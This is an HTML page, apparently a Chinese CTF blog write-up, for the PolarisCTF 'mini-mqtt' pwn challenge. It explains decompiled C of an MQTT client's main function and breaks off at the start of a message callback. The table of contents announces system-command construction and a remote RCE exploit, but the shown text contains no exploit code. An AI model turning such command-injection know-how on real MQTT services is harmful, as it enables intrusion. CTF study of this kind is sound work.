@@ -1,0 +1,759 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    mini-mqtt | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="mini-mqttmqtt 的题目也是第一次见，PolarisCTF 的质量确实很高，有 WEBPWN的复现环境也是很好了  程序分析：main1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int __fastcall main(int argc, const char **">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mini-mqtt">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/PolarisCTF_2026_WEBPWN/mini-mqtt/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="mini-mqttmqtt 的题目也是第一次见，PolarisCTF 的质量确实很高，有 WEBPWN的复现环境也是很好了  程序分析：main1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int __fastcall main(int argc, const char **">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/xhzxKeoe6j9RO_yj/1779283389013-b4ce8544-c0c3-44e5-b9a5-d2745d22067c-222182.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/xhzxKeoe6j9RO_yj/1779284661800-6107c775-b974-4cee-8b53-81d04b35c2e2-185074.png">
+<meta property="article:published_time" content="2026-05-22T18:46:53.000Z">
+<meta property="article:modified_time" content="2026-05-22T18:58:43.520Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/xhzxKeoe6j9RO_yj/1779283389013-b4ce8544-c0c3-44e5-b9a5-d2745d22067c-222182.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/categories">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">分类</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/tags">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">标签</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="mini-mqtt">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">mini-mqtt</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mini-mqtt"><span class="toc-number">1.</span> <span class="toc-text">mini-mqtt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.1.</span> <span class="toc-text">main</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA-MQTT-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">创建 MQTT 客户端实例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">设置回调函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E9%93%BE%E6%8E%A5%E5%8F%82%E6%95%B0"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">配置链接参数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5%E5%92%8C%E4%B8%BB%E5%BE%AA%E7%8E%AF"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">建立连接和主循环</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E4%B8%8E%E9%80%80%E5%87%BA"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">清理与退出</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msgarrvd"><span class="toc-number">1.1.2.</span> <span class="toc-text">msgarrvd</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%BF%98%E5%8E%9F%E4%B8%8E%E7%90%86%E8%A7%A3"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">参数还原与理解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E6%B6%88%E6%81%AF%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">提取消息内容</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E8%BF%87%E6%BB%A4%EF%BC%88if-%E5%88%86%E6%94%AF%EF%BC%89"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">消息过滤（if 分支）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E5%85%B6%E4%BB%96%E6%B6%88%E6%81%AF%EF%BC%88else-%E5%88%86%E6%94%AF%EF%BC%89"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">处理其他消息（else 分支）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http"><span class="toc-number">1.1.3.</span> <span class="toc-text">http</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E8%87%AA%E5%8F%91%E6%B6%88%E6%81%AF%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">变量初始化与自发消息过滤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-HTTP-%E8%AF%B7%E6%B1%82%E5%B9%B6%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">解析 HTTP 请求并提取文件名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E6%B3%95%E6%80%A7%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">合法性校验</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">构造系统命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%B9%B6%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C"><span class="toc-number">1.1.3.5.</span> <span class="toc-text">执行命令并返回结果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-EXP-%E8%BF%9B%E8%A1%8C-RCE%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">利用 EXP 进行 RCE：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%88remote%EF%BC%89%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">总 EXP（remote）：</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PolarisCTF_2026_WEBPWN/mini-mqtt" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-22T18:46:53.000Z" itemprop="datePublished">2026-05-23</time>
+    <time style="display: none;" id="post-update-time">2026-05-23</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-05-22T18:58:43.520Z" itemprop="dateModified">2026-05-23</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="mini-mqtt"><a href="#mini-mqtt" class="headerlink" title="mini-mqtt"></a>mini-mqtt</h1><p>mqtt 的题目也是第一次见，PolarisCTF 的质量确实很高，有 WEBPWN的复现环境也是很好了</p>
+<p><img src="/HFTTC.github.io/images/pwn/xhzxKeoe6j9RO_yj/1779283389013-b4ce8544-c0c3-44e5-b9a5-d2745d22067c-222182.png" alt="1779283389013-b4ce8544-c0c3-44e5-b9a5-d2745d22067c.png"></p>
+<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( argc &lt;= <span class="number">1</span> )</span><br><span class="line">        v3 = <span class="string">&quot;tcp://localhost:9999&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        v3 = argv[<span class="number">1</span>];</span><br><span class="line">    v5 = v3;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Using server at %s\n&quot;</span>, v3);                     <span class="comment">// 打印当前使用的服务器地址。</span></span><br><span class="line">        rc = MQTTClient_create(&amp;client, v5, <span class="string">&quot;httpclient&quot;</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( rc )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to create client, return code %d\n&quot;</span>, rc);</span><br><span class="line">        rc = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        rc = MQTTClient_setCallbacks(client, <span class="number">0</span>, connlost, msgarrvd, delivered);</span><br><span class="line">        <span class="keyword">if</span> ( rc )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to set callbacks, return code %d\n&quot;</span>, rc);</span><br><span class="line">            rc = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            dword_5028 = <span class="number">20</span>;</span><br><span class="line">            dword_502C = <span class="number">1</span>;</span><br><span class="line">            rc = MQTTClient_connect(client, conn_opts);</span><br><span class="line">            <span class="keyword">if</span> ( !rc )</span><br><span class="line">            &#123;</span><br><span class="line">                MQTTClient_subscribe(client, <span class="string">&quot;HTTP&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    sleep(<span class="number">1u</span>);</span><br><span class="line">                    msgsend(<span class="string">&quot;200&quot;</span>);</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;waiting for message\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to connect, return code %d\n&quot;</span>, rc);</span><br><span class="line">            rc = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        MQTTClient_destroy(&amp;client);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>emmm 有点忘了，查了一下 argc，argv，envp 都表示什么：</p>
+<ul>
+<li>argc 指的就是命令的数量，比如<code>./mqtt_client tcp://192.168.1.100:1883</code>的 argc 就是 2</li>
+<li>argv 指的是参数的具体内容，比如 argv[0] 的值是 <code>&quot;./mqtt_client&quot;</code></li>
+<li>envp 就是环境变量指针，不过我们一般是用不到他的</li>
+</ul>
+<hr>
+<h5 id="创建-MQTT-客户端实例"><a href="#创建-MQTT-客户端实例" class="headerlink" title="创建 MQTT 客户端实例"></a>创建 MQTT 客户端实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rc = MQTTClient_create(&amp;client, v5, <span class="string">&quot;httpclient&quot;</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>初始化并创建一个 MQTT 客户端句柄。</p>
+<ul>
+<li><code>&amp;client</code>：全局变量，用于存储创建好的客户端句柄。</li>
+<li><code>v5</code>：上一步确定的服务器 URI（如 <code>tcp://localhost:9999</code>）。</li>
+<li><code>&quot;httpclient&quot;</code>：Client ID（客户端标识符），在 MQTT 代理中必须是唯一的。</li>
+<li><code>1</code>：持久化类型，<code>1</code> 对应宏 <code>MQTTCLIENT_PERSISTENCE_NONE</code>，表示在内存中保存状态，不写入磁盘。</li>
+<li><code>0</code>：持久化上下文（无持久化时传 0 或 NULL）。</li>
+<li><strong>错误处理</strong>：如果返回值 <code>rc</code> 不为 0，说明创建失败，程序会打印错误码并将退出码设为 1。</li>
+</ul>
+<hr>
+<h5 id="设置回调函数"><a href="#设置回调函数" class="headerlink" title="设置回调函数"></a>设置回调函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rc = MQTTClient_setCallbacks(client, <span class="number">0</span>, connlost, msgarrvd, delivered);</span><br></pre></td></tr></table></figure>
+
+<p>为客户端绑定异步事件的处理函数（由于是反编译代码，这些函数在别处定义）。</p>
+<ul>
+<li><strong>参数解析</strong>：</li>
+<li><code>0</code>：用户上下文指针（Context），这里为空。</li>
+<li><code>connlost</code>：<strong>连接丢失</strong>时触发的回调函数。</li>
+<li><code>msgarrvd</code>：<strong>接收到订阅消息</strong>时触发的回调函数。</li>
+<li><code>delivered</code>：<strong>消息成功送达</strong>（针对 QoS 1 或 2）时触发的回调函数。</li>
+</ul>
+<hr>
+<h5 id="配置链接参数"><a href="#配置链接参数" class="headerlink" title="配置链接参数"></a>配置链接参数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dword_5028 = <span class="number">20</span>;</span><br><span class="line">dword_502C = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这两行是反编译器对全局结构体 <code>MQTTClient_connectOptions</code>（连接选项）成员赋值的底层还原。</p>
+<ul>
+<li><code>dword_5028 = 20</code>：通常对应 <code>keepAliveInterval</code>，表示心跳保活时间为 20 秒。</li>
+<li><code>dword_502C = 1</code>：通常对应 <code>cleansession</code>，表示开启清除会话（设为 1&#x2F;true）。客户端断开后，代理服务器不会保留它的订阅和离线消息。</li>
+</ul>
+<hr>
+<h5 id="建立连接和主循环"><a href="#建立连接和主循环" class="headerlink" title="建立连接和主循环"></a>建立连接和主循环</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rc = MQTTClient_connect(client, conn_opts);</span><br><span class="line">  <span class="keyword">if</span> ( !rc )</span><br><span class="line">  &#123;</span><br><span class="line">    MQTTClient_subscribe(client, <span class="string">&quot;HTTP&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sleep(<span class="number">1u</span>);</span><br><span class="line">      msgsend(<span class="string">&quot;200&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;waiting for message\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>连接服务器</strong>：调用 <code>MQTTClient_connect</code> 发起连接（<code>!rc</code> 意味着连接成功）。</li>
+<li><strong>订阅主题</strong>：成功连接后，调用 <code>MQTTClient_subscribe(client, &quot;HTTP&quot;, 1)</code> 订阅名为 <strong>“HTTP”</strong> 的主题，服务质量（QoS）级别设为 <strong>1</strong>（至少送达一次）。</li>
+<li><strong>死循环（业务逻辑）</strong>：</li>
+<li><code>sleep(1u)</code>：程序休眠 1 秒。</li>
+<li><code>msgsend(&quot;200&quot;)</code>：调用内部自定义函数 <code>msgsend</code> 发送消息 <code>&quot;200&quot;</code>（具体发送到哪个主题需查看 <code>msgsend</code> 的实现）。</li>
+<li><code>puts(...)</code>：终端打印 <code>&quot;waiting for message\n&quot;</code>。</li>
+<li><em>注意</em>：因为这里是 <code>while (1)</code> 死循环，程序在此处会无限执行发送动作，同时后台线程会通过之前设置的 <code>msgarrvd</code> 回调函数来处理接收到的消息</li>
+</ul>
+<h5 id="清理与退出"><a href="#清理与退出" class="headerlink" title="清理与退出"></a>清理与退出</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MQTTClient_destroy(&amp;client);</span><br><span class="line"><span class="keyword">return</span> rc;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>清理</strong>：如果连接失败（跳过了死循环），或者程序因为某种外部中断跳出了循环，最终会调用 <code>MQTTClient_destroy</code> 销毁客户端，释放内存。</li>
+<li><strong>返回</strong>：返回状态码 <code>rc</code>（0 为成功，1 为失败）。</li>
+</ul>
+<h4 id="msgarrvd"><a href="#msgarrvd" class="headerlink" title="msgarrvd"></a>msgarrvd</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">msgarrvd</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">int</span> a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v5; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v6; 